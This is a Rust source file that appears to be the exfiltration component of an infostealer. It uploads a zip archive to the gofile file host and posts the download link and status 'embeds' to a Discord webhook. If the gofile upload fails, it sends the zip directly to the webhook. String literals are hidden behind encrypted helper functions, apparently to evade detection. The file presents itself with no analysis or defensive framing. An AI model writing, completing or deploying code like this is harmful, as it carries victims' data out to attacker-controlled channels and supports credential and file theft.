use serde_json::{json, Value};
use crate::encrypted::*;

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct DeliveryMeta {
    pub zip_path: String,
    pub zip_name: String,
    pub embeds: Vec<Value>,
}

pub async fn upload_to_gofile(client: &reqwest::Client, zip_data: Vec<u8>, zip_name: &str) -> Option<String> {
    let upload_url = s_gofile_upload_url();
    
    let zip_part = reqwest::multipart::Part::bytes(zip_data)
        .file_name(zip_name.to_string())
        .mime_str(&s_sender_application_zip())
        .ok()?;
    
    let form = reqwest::multipart::Form::new().part(s_sender_file(), zip_part);
    
    let response = match client
        .post(&upload_url)
        .header(s_sender_origin(), &s_gofile_domain())
        .header(s_sender_referer(), &s_gofile_referer())
        .multipart(form)
        .send()
        .await
    {
        Ok(r) => r,
        Err(_) => return None,
    };
    
    let body = response.text().await.ok()?;

    let v: Value = match serde_json::from_str(&body) {
        Ok(j) => j,
        Err(_) => {
            if body.contains(&s_sender_gofile_io()) || body.contains(&s_sender_download()) {
                if let Some(start) = body.find(&s_sender_https()) {
                    for delim in ['"', '\'', ' '] {
                        if let Some(end) = body[start..].find(delim) {
                            return Some(body[start..start + end].to_string());
                        }
                    }
                }
            }
            return None;
        }
    };

    if v["status"].as_str() != Some("ok") { return None; }
    let data = &v["data"];
    if let Some(s) = data["downloadPage"].as_str().filter(|s| !s.is_empty()) {
        return Some(s.to_owned());
    }
    if let Some(s) = data["directLink"].as_str().filter(|s| !s.is_empty()) {
        return Some(s.to_owned());
    }
    // New API (2025): folder code for public download page
    if let Some(code) = data["parentFolderCode"].as_str().filter(|s| !s.is_empty()) {
        return Some(format!("{}/{}", s_gofile_download_path(), code));
    }
    if let Some(code) = data["code"].as_str().filter(|s| !s.is_empty()) {
        return Some(format!("{}/{}", s_gofile_download_path(), code));
    }
    // Legacy + new field names for file id
    if let Some(id) = data["fileId"].as_str().or_else(|| data["id"].as_str()).filter(|s| !s.is_empty()) {
        return Some(format!("{}/{}", s_gofile_download_path(), id));
    }
    None
}

pub async fn send_embeds_only(
    client: &reqwest::Client,
    webhook_url: &str,
    embeds: &[serde_json::Value],
) {
    for chunk in embeds.chunks(10) {
        let payload = json!({ s_sender_embeds(): chunk });
        let _ = client.post(webhook_url).json(&payload).send().await;
    }
}

pub async fn send_to_webhook(
    client: &reqwest::Client,
    webhook_url: &str,
    embeds: Vec<serde_json::Value>,
    zip_data: Vec<u8>,
    zip_name: String,
) -> Vec<String> {
    let mut statuses: Vec<String> = Vec::new();

    // Gofile upload + Discord embeds in parallel (gofile API is fast; don't serialize them).
    let client_embeds = client.clone();
    let webhook_embeds = webhook_url.to_string();
    let embeds_copy = embeds.clone();

    let embeds_task = tokio::spawn(async move {
        let mut embed_statuses = Vec::new();
        for (ci, chunk) in embeds_copy.chunks(10).enumerate() {
            let payload = json!({ s_sender_embeds(): chunk });
            let r = client_embeds.post(&webhook_embeds).json(&payload).send().await;
            embed_statuses.push(format!(
                "{}{}]={}",
                s_sender_embeds_status(),
                ci,
                r.map(|r| r.status()).unwrap_or_default()
            ));
        }
        embed_statuses
    });

    let gofile_link = upload_to_gofile(client, zip_data.clone(), &zip_name).await;

    statuses.extend(embeds_task.await.unwrap_or_default());
    statuses.push(if gofile_link.is_some() { s_sender_gofile_ok() } else { s_sender_gofile_fail() });

    let content = if let Some(ref link) = gofile_link {
        format!("\u{1f4e6} Download: {}", link)
    } else {
        String::new()
    };

    let r = client.post(webhook_url).json(&json!({s_sender_content(): content})).send().await;
    statuses.push(format!("content={}", r.map(|r| r.status()).unwrap_or_default()));

    // Discord direct upload only when gofile truly failed (slow — avoid if parsing was the bug).
    if gofile_link.is_none() {
        if let Ok(zip_part) = reqwest::multipart::Part::bytes(zip_data)
            .file_name(zip_name)
            .mime_str(&s_sender_application_zip())
        {
            let zip_form = reqwest::multipart::Form::new().part(s_sender_file(), zip_part);
            let r = client.post(webhook_url).multipart(zip_form).send().await;
            statuses.push(format!("zip_fallback={}", r.map(|r| r.status()).unwrap_or_default()));
        }
    }

    statuses
}
